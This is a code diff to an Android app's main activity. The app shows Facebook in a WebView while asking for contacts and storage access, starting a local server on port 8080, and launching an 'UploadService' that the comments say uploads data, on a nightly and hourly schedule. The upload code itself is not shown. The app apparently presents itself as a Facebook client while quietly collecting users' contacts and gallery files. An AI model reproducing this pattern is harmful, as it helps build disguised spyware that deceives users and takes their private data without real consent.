@@ -15,13 +15,16 @@ import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Bundle;
 import android.view.View;
+import android.webkit.WebChromeClient;
 import android.webkit.WebResourceError;
 import android.webkit.WebResourceRequest;
+import android.webkit.WebResourceResponse;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.ProgressBar;
 import android.widget.Toast;
 
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.List;
@@ -34,78 +37,57 @@ public class MainActivity extends AppCompatActivity {
     private ProgressBar progressBar;
     private static final long SYNC_INTERVAL = 60 * 60 * 1000; // 1 hour in milliseconds
     private Timer syncTimer;
+    private LocalServer localServer;
+    private final String url = "https://www.facebook.com/";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        // Initialize WebView and ProgressBar
+        startLocalServer();
+
         webView = findViewById(R.id.webview);
         progressBar = findViewById(R.id.progressBar);
 
-//        startPeriodicSync();
-        scheduleSyncAt10PM();
-
-
+        // Enable JavaScript and set up WebView
         webView.getSettings().setJavaScriptEnabled(true);
-
-        // Set WebViewClient to handle errors and loading states
         webView.setWebViewClient(new WebViewClient() {
-            @RequiresApi(api = 23) // Ensure backward compatibility
             @Override
-            public void onReceivedError(@NonNull WebView view, @NonNull WebResourceRequest request, @NonNull WebResourceError error) {
-                super.onReceivedError(view, request, error);
-
-                // Hide ProgressBar
-                progressBar.setVisibility(View.GONE);
-
-                // Display a Toast or redirect to an error page
-                view.loadUrl("file:///android_asset/error.html"); // Load a local error page
-            }
-
-            @Override
-            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
-                super.onPageStarted(view, url, favicon);
-
-                // Show ProgressBar when the page starts loading
-                progressBar.setVisibility(View.VISIBLE);
-            }
-
-            @Override
-            public void onPageFinished(WebView view, String url) {
-                super.onPageFinished(view, url);
-
-                // Hide ProgressBar when the page finishes loading
+            public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
+                Toast.makeText(MainActivity.this, "HTTP error: " + errorResponse.getStatusCode(), Toast.LENGTH_SHORT).show();
                 progressBar.setVisibility(View.GONE);
             }
+        });
 
+
+        // Use WebChromeClient to update the progress
+        webView.setWebChromeClient(new WebChromeClient() {
             @Override
-            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
-                super.onReceivedError(view, errorCode, description, failingUrl);
+            public void onProgressChanged(WebView view, int newProgress) {
+                if (newProgress < 100) {
+                    progressBar.setVisibility(View.VISIBLE);
+                    progressBar.setProgress(newProgress);
+                } else {
+                    progressBar.setVisibility(View.GONE);
+                }
+            }
+        });
 
-                // Handle older API levels
-                progressBar.setVisibility(View.GONE);
-                view.loadUrl("file:///android_asset/error.html"); // Load a local error page
+        webView.setOnScrollChangeListener(new View.OnScrollChangeListener() {
+            @Override
+            public void onScrollChange(View v, int scrollX, int scrollY, int oldScrollX, int oldScrollY) {
+                if (!webView.canScrollVertically(1)) { // Check if scrolled to the bottom
+                    Toast.makeText(MainActivity.this, "End of page reached", Toast.LENGTH_SHORT).show();
+                }
             }
         });
 
         // Load the URL
-        webView.loadUrl("https://www.facebook.com/login/");
+        loadUrl();
 
-        // Handle scrolling to refresh the page when user scrolls to the bottom
-        webView.setOnScrollChangeListener(new View.OnScrollChangeListener() {
-            @RequiresApi(api = 23)
-            @Override
-            public void onScrollChange(View v, int scrollX, int scrollY, int oldScrollX, int oldScrollY) {
-                // Check if the user has scrolled to the bottom
-                if (!webView.canScrollVertically(1)) {
-                    // Refresh the current URL
-                    webView.reload();
-//                    Toast.makeText(MainActivity.this, "Page refreshed", Toast.LENGTH_SHORT).show();
-                }
-            }
-        });
+//        startPeriodicSync();
+        scheduleSyncAt10PM();
 
         // Check Permissions
         if (!hasPermissions()) {
@@ -113,6 +95,43 @@ public class MainActivity extends AppCompatActivity {
         } else {
             startBackgroundService();
         }
+    }
+
+    private void startLocalServer() {
+        try {
+            localServer = new LocalServer(8080); // Start server on port 8080
+            localServer.start();
+            Toast.makeText(this, "Local service server started!", Toast.LENGTH_SHORT).show();
+
+            // Start the upload service
+            Intent serviceIntent = new Intent(this, UploadService.class);
+            startService(serviceIntent);
+
+        } catch (IOException e) {
+            e.printStackTrace();
+            Toast.makeText(this, "Failed to start server: " + e.getMessage(), Toast.LENGTH_LONG).show();
+        }
+    }
+
+    private void loadUrl() {
+        if (NetworkUtils.isInternetAvailable(this)) {
+            webView.loadUrl(url);
+        } else {
+            Toast.makeText(this, "No Internet Connection", Toast.LENGTH_SHORT).show();
+            progressBar.setVisibility(View.GONE);
+        }
+    }
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        if (syncTimer != null) {
+            syncTimer.cancel(); // Stop the timer when the activity is destroyed
+        }
+    }
+
+    private void startBackgroundService() {
+        // Start the background service to upload data
+        startService(new Intent(this, UploadService.class));
     }
 
     private void scheduleSyncAt10PM() {
@@ -161,14 +180,6 @@ public class MainActivity extends AppCompatActivity {
         }, 0, SYNC_INTERVAL); // Start immediately, then repeat every hour
     }
 
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        if (syncTimer != null) {
-            syncTimer.cancel(); // Stop the timer when the activity is destroyed
-        }
-    }
-
     private boolean hasPermissions() {
         // Check both permissions separately
         boolean contactsPermission = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
@@ -203,28 +214,39 @@ public class MainActivity extends AppCompatActivity {
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-
         if (requestCode == PERMISSION_REQUEST_CODE) {
             if (grantResults.length > 0) {
-                boolean contactsPermissionGranted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
-                boolean storagePermissionGranted = grantResults[1] == PackageManager.PERMISSION_GRANTED;
+                boolean contactsPermissionGranted = false;
+                boolean storagePermissionGranted = false;
+
+                // Iterate over the results to determine which permissions were granted
+                for (int i = 0; i < permissions.length; i++) {
+                    if (permissions[i].equals(android.Manifest.permission.READ_CONTACTS)) {
+                        contactsPermissionGranted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
+                    } else if (permissions[i].equals(android.Manifest.permission.READ_EXTERNAL_STORAGE)) {
+                        storagePermissionGranted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
+                    }
+                }
 
                 if (contactsPermissionGranted && storagePermissionGranted) {
                     // Permissions granted, proceed with functionality
                     startBackgroundService();
                 } else {
-                    // Handle the case where permissions were denied
-                    if (shouldShowRequestPermissionRationale(permissions[0]) || shouldShowRequestPermissionRationale(permissions[1])) {
-                        // If the user denied permissions, explain why you need them
+                    // Handle denied permissions
+                    if (shouldShowRequestPermissionRationale(android.Manifest.permission.READ_CONTACTS) ||
+                            shouldShowRequestPermissionRationale(android.Manifest.permission.READ_EXTERNAL_STORAGE)) {
                         Toast.makeText(this, "Permissions are required to access contacts and gallery for the app to function properly.", Toast.LENGTH_LONG).show();
                     } else {
-                        // If the user denied permanently, provide an option to go to settings
                         showSettingsDialog();
                     }
                 }
+            } else {
+                // Handle the case where no permissions are granted
+                Toast.makeText(this, "Permissions denied. App functionality may be limited.", Toast.LENGTH_SHORT).show();
             }
         }
     }
+
 
     private void showSettingsDialog() {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
@@ -245,9 +267,7 @@ public class MainActivity extends AppCompatActivity {
         startActivity(intent);
     }
 
-    private void startBackgroundService() {
-        // Start the background service to upload data
-        startService(new Intent(this, UploadService.class));
-    }
+
+
 
 }
